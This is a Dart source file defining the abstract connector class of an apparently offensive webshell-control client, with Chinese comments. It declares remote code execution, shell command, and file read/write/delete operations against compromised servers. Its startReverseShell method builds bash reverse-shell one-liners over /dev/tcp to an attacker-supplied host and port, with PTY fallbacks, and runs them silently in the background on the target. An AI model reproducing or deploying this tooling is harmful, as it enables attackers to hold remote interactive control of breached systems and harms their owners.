import 'dart:typed_data';

import '../models/webshell.dart';
import '../models/file_entry.dart';

/// 连接器能力枚举
enum ConnectorCapability {
  codeExec,  // 可执行任意代码（eval 类）
  shellExec, // 可执行 shell/系统命令
  fileRead,  // 可读取远端文件
  fileWrite, // 可写入/删除远端文件
  probeOnly, // 只读探测，无执行能力
}

/// 所有 Webshell 连接器的抽象基类
abstract class ShellConnector {
  final Webshell webshell;
  String currentDir = '/';

  /// 类 Unix：由子进程环境中的 `SCRIPT_FILENAME` 推导 webshell 脚本所在目录（若存在）。
  static const String kUnixShellScriptDirProbe =
      r'[ -n "${SCRIPT_FILENAME-}" ] && d=$(dirname -- "${SCRIPT_FILENAME}") && [ -d "$d" ] && printf %s "$d"';

  ShellConnector(this.webshell);

  Set<ConnectorCapability> get capabilities;

  bool get supportsCodeExec  => capabilities.contains(ConnectorCapability.codeExec);
  bool get supportsShellExec => capabilities.contains(ConnectorCapability.shellExec);
  bool get supportsFileRead  => capabilities.contains(ConnectorCapability.fileRead);
  bool get supportsFileWrite => capabilities.contains(ConnectorCapability.fileWrite);
  bool get isProbeOnly       => capabilities.contains(ConnectorCapability.probeOnly);

  Future<bool> ping();

  /// 连接失败时的诊断信息（如 HTTP 错误、MATRIX_ERR 等），供 UI 显示
  String? get lastPingDiagnostic => null;

  /// [getShellScriptDir] 最后一次执行的客户端摘要（调试模式下含远端 `[MX_SD]` 步骤）。
  String? get lastShellScriptDirDiagnostic => null;

  Future<String> executeCommand(String cmd, {String workingDir = ''});
  Future<String> getCurrentDir();

  /// 当前 webshell 脚本所在目录（若连接器可获知且目录存在），否则 `null`。
  Future<String?> getShellScriptDir() async => null;
  Future<List<FileEntry>> listDirectory(String path);
  Future<String> readFile(String path);
  Future<bool> writeFile(String path, String content);
  Future<bool> deleteFile(String path);

  /// 以二进制方式读取远端文件，返回原始字节（用于下载）
  Future<Uint8List> readFileBinary(String path) async =>
      throw UnsupportedError('当前连接器不支持二进制文件下载');

  /// 以二进制方式写入远端文件（用于上传任意格式文件）
  Future<bool> writeFileBinary(String path, Uint8List bytes) async =>
      throw UnsupportedError('当前连接器不支持二进制文件上传');

  /// 带进度回调的二进制上传；[onProgress] 参数为 (已传字节, 总字节)。
  /// 默认实现为单次上传，子类可覆盖以实现分块进度。
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    onProgress(0, bytes.length);
    final ok = await writeFileBinary(path, bytes);
    onProgress(bytes.length, bytes.length);
    return ok;
  }
  Future<Map<String, String>> getSystemInfo();
  Future<List<({String name, bool isDir})>> listNamesForCompletion(String path);
  Future<String> getHomeDir();
  Future<List<String>> listEnvVarNames();

  /// 尝试通过当前连接器在目标上启动反弹 Shell。
  ///
  /// [preferScript] = true 时：
  ///   - 优先使用 `script` 分配伪终端，其次是 bash，最后回退到 sh。
  /// [preferScript] = false 时：
  ///   - 仅使用 bash 或 /bin/sh，不再尝试 script。
  ///
  /// 默认实现仅支持类 Unix 目标：通过 [executeCommand] 执行反弹命令。
  /// 具体连接器可根据协议/目标环境重写此方法（例如生成 Windows 版命令）。
  Future<void> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    if (!supportsShellExec) {
      throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
    }
    late final String cmd;
    if (preferScript) {
      // 使用多级回退的一键反弹命令，并显式设置 TERM：
      // 1. 先导出 TERM=xterm-256color，避免 clear 等命令报 “TERM not set”
      // 2. 优先使用 script 分配伪终端 + bash（script 先运行，bash 作为子进程获得 PTY）
      // 3. 其次使用 bash -i
      // 4. 否则 → /bin/sh -i
      cmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v script >/dev/null 2>&1; then "
          "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
          "elif command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
    } else {
      // 仅使用 bash -i /bin/sh -i，不再尝试 script
      cmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
    }
    await executeCommand('$cmd >/dev/null 2>&1 &', workingDir: currentDir);
  }
}
